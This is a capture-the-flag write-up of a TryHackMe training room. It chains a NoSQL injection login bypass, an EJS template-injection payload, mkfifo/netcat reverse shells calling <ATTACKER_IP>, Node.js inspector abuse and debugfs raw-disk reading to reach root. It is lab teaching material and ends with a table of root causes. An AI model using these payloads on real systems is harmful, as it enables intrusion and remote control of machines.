# 🌺 TryHackMe Writeup: Do Not Disturb

> **Platform:** TryHackMe
> **Room:** Do Not Disturb


---

## 📖 Room Overview

In this room, we exploit multiple vulnerabilities to compromise the **Do Not Disturb room** and obtain **root access**.

The attack chain demonstrates how seemingly small security issues can be combined into a complete system compromise.

### Attack Path

```text
NoSQL Injection
        │
        ▼
Authentication Bypass
        │
        ▼
Server-Side Template Injection (SSTI)
        │
        ▼
Remote Code Execution
        │
        ▼
Reverse Shell (poolside)
        │
        ▼
Node.js Inspector Abuse
        │
        ▼
Shell as pipelinesvc
        │
        ▼
debugfs Privilege Escalation
        │
        ▼
ROOT 🚩
```

---

# Initial Foothold

## Step 1 – Authentication Bypass (NoSQL Injection)

The login form is backed by a **NeDB** database.


Because the application doesn't validate the input type, MongoDB operators can be injected.

Using the payload:

```
password[$ne]=invalid
```

changes the query into:

> Find a user whose password is **not equal** to `"invalid"`.

Since every valid password satisfies this condition, authentication is bypassed successfully.
<img width="599" height="289" alt="7burp" src="https://github.com/user-attachments/assets/8125efe5-fa83-4455-9d74-572871650924" />


✅ Logged in as the application user.

---

## Step 2 – Server-Side Template Injection (SSTI)

After logging in, the application provides a **Confirmation Template Preview** feature powered by **EJS**.

Because user input is rendered directly as an EJS template, arbitrary JavaScript can be executed.

### Verifying Code Execution
<img width="627" height="551" alt="7_burp _answe" src="https://github.com/user-attachments/assets/e41e97dc-b146-4305-804c-f2f3769ade1c" />


```ejs
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

Output:

```text
uid=996(poolside)
gid=996(poolside)
```
<img width="568" height="668" alt="7eij" src="https://github.com/user-attachments/assets/0c27a6aa-b989-47da-95fd-34f96258886b" />


This confirms remote code execution as the **poolside** user.

---

## Step 3 – Getting a Reverse Shell

Start a Netcat listener:

```bash
nc -lvnp 4444
```

Inject the following payload:

```ejs
<%= global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f') %>
```

A reverse shell is received:

```bash
poolside@target:~$
```
and i find user.txt /home/poolside/user.txt

---

# Enumeration

## Running Processes

```bash
ps aux | grep -v "\["
```

Among the running processes we find:

```text
pipelinesvc   601  /usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

This indicates that a Node.js application is running with the **Inspector Protocol** enabled.

---

## Listening Services

To identify locally exposed services, run:

```bash
ss -tulpn
```

Output:

```text
Netid State  Recv-Q Send-Q      Local Address:Port
tcp   LISTEN 0      511             127.0.0.1:9229
tcp   LISTEN 0      511                     *:80
tcp   LISTEN 0      4096              0.0.0.0:22
```

The most interesting service is **127.0.0.1:9229**, the default **Node.js Inspector** port. Since we already have local shell access, we can connect to it directly.

---

# Lateral Movement

## Abusing the Node.js Inspector

Connect to the debugger:

```bash
node inspect 127.0.0.1:9229
```

Inside the debugger:

```javascript
exec("global.process.mainModule.require('child_process').exec('rm /tmp/f2;mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4445 >/tmp/f2')")
```

Start another listener:

```bash
nc -lvnp 4445
```

A new shell is received:

```bash
pipelinesvc@target:~$
```

Successfully escalated from **poolside** to **pipelinesvc**.

---

# Privilege Escalation

## Enumerating Storage Devices

```bash
lsblk
```

Output:

```text
NAME        MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS
nvme0n1     259:1    0 20G  0 disk
└─nvme0n1p1 259:2    0 20G  0 part /
```

The service account has permission to access the raw block device.

---

## Reading the Filesystem with `debugfs`

Open the filesystem:

```bash
debugfs /dev/nvme0n1p1
```

Navigate to the root directory:

```text
cd root
```

List files:

```text
ls
```

Read the flag:

```text
cat root.txt
```

Output:

```text
THM{r4w_d1sk_4cc3********_t00_much}
```

🎉 Root access achieved.

---


# Skills Practiced

* NoSQL Injection
* Authentication Bypass
* Server-Side Template Injection (SSTI)
* Remote Code Execution (RCE)
* Reverse Shells
* Linux Enumeration
* Node.js Inspector Abuse
* Privilege Escalation
* `debugfs`
* Process & Service Enumeration

---

| Vulnerability | Why It Happened |
|---------------|-----------------|
| NoSQL Injection | User input passed directly into database queries | 
| Authentication Bypass | Query operators (`$ne`) accepted as input | 
| Server-Side Template Injection | User input compiled as an EJS template 
| Remote Code Execution | SSTI allowed execution of system commands |
| Exposed Node.js Inspector | Debugger left enabled in production |
| Raw Disk Access | Unprivileged service account could read block devices |
---
